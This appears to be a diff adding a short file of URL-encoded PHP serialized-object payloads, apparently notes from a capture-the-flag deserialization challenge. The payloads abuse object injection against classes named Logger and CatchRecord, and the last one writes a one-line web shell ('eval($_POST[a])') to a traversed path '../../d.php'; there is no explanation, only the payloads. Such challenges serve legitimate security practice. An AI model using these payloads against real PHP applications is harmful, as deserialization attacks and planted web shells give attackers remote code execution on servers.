@@ -1,0 +1,7 @@
+ans=O%3A7%3A"GetGetflagflag"%3A2%3A%7Bs%3A8%3A"%00%2A%00value"%3Bi%3A1%3B%7D
+
+O:6:"Logger":3:{s:8:"filename";i:0;s:3:"out";R:2;s:3:"msg";s:9:"/aa/b.php";}
+O%3A6%3A%22Logger%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bi%3A0%3Bs%3A3%3A%22out%22%3BR%3A2%3Bs%3A3%3A%22msg%22%3Bs%3A9%3A%22%2Faa%2Fb.php%22%3B%7D2019/10/26/07/49/19:/aa/b.php
+
+
+a=O%3A11%3A"CatchRecord"%3A3%3A%7Bs%3A8%3A"filename"%3Bi%3A0%3Bs%3A3%3A"out"%3BR%3A2%3Bs%3A3%3A"msg"%3Bs%3A38%3A"%2F<%3Fphp+eval%28%24_POST%5Ba%5D%29%3B+%3F>%2F..%2F..%2Fd.php"%3B%7D
